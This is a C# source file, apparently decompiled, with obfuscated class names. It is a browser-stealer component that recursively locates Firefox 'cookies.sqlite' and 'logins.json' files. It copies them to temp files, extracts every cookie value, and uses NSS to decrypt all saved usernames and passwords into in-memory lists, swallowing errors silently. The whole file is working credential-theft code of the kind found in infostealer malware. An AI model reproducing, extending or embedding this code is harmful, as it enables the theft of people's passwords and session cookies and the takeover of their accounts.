using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SHARP
{
    internal class GBRWSR
    {
      private static async Task<bool> ex(string path) => new FileInfo(path).Length > 0L;

      public static async Task<CookieFormat[]> GetCookies(string BrowserPath)
      {
        List<CookieFormat> cookies = new List<CookieFormat>();
        string[] strArray = await Task.Run<string[]>((Func<string[]>) (() => Directory.GetFiles(BrowserPath, "cookies.sqlite", SearchOption.AllDirectories)));
        for (int index = 0; index < strArray.Length; ++index)
        {
          string cookiesFilePath = strArray[index];
          try
          {
            string str;
            do
            {
              if (await GBRWSR.ex(cookiesFilePath))
                str = Path.Combine(Path.GetTempPath(), BRWSR.GenerateRandomString(37));
              else
                goto label_15;
            }
            while (File.Exists(str));
            File.Copy(cookiesFilePath, str);
            SQLiteHandler sqLiteHandler = new SQLiteHandler(cookiesFilePath);
            if (sqLiteHandler.ReadTable("moz_cookies"))
            {
              for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
              {
                string host = sqLiteHandler.GetValue(row_num, "host");
                string name = sqLiteHandler.GetValue(row_num, "name");
                string path = sqLiteHandler.GetValue(row_num, "path");
                string cookie = sqLiteHandler.GetValue(row_num, "value");
                string expiry = sqLiteHandler.GetValue(row_num, "expiry");
                if (!string.IsNullOrWhiteSpace(host) && !string.IsNullOrWhiteSpace(name) && cookie != null && cookie.Length > 0)
                  cookies.Add(new CookieFormat(host, name, path, cookie, expiry));
              }
              File.Delete(str);
            }
            else
              continue;
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
    label_15:
          cookiesFilePath = (string) null;
        }
        strArray = (string[]) null;
        CookieFormat[] array = cookies.ToArray();
        cookies = (List<CookieFormat>) null;
        return array;
      }

      public static async Task<PasswordFormat[]> GetPasswords(string BrowserPath)
      {
        List<PasswordFormat> passwords = new List<PasswordFormat>();
        foreach (string str1 in await Task.Run<string[]>((Func<string[]>) (() => Directory.GetFiles(BrowserPath, "logins.json", SearchOption.AllDirectories))))
        {
          Console.WriteLine(str1);
          try
          {
            GDecryptor.NSS_Init(Path.GetDirectoryName(str1));
            string str2 = Path.Combine(Path.GetTempPath(), BRWSR.GenerateRandomString(30));
            File.Copy(str1, str2, true);
            MatchCollection matchCollection = Regex.Matches(File.ReadAllText(str2), "\"hostname\":\\s*\"([^\"]*)\".*?\"encryptedUsername\":\\s*\"([^\"]*)\".*?\"encryptedPassword\":\\s*\"([^\"]*)\"", RegexOptions.Singleline);
            Console.WriteLine(matchCollection.Count);
            for (int i = 0; i < matchCollection.Count; ++i)
            {
              Match match = matchCollection[i];
              if (match.Groups.Count >= 3)
              {
                string cypherText1 = match.Groups[3].Value;
                string cypherText2 = match.Groups[2].Value;
                string str3 = match.Groups[1].Value;
                string password = GDecryptor.Decrypt(cypherText1);
                string username = GDecryptor.Decrypt(cypherText2);
                string url = str3;
                if (!string.IsNullOrWhiteSpace(url) && password.Length > 0)
                  passwords.Add(new PasswordFormat(username, password, url));
              }
            }
            File.Delete(str2);
          }
          catch
          {
          }
        }
        PasswordFormat[] array = passwords.ToArray();
        passwords = (List<PasswordFormat>) null;
        return array;
      }
    }
}
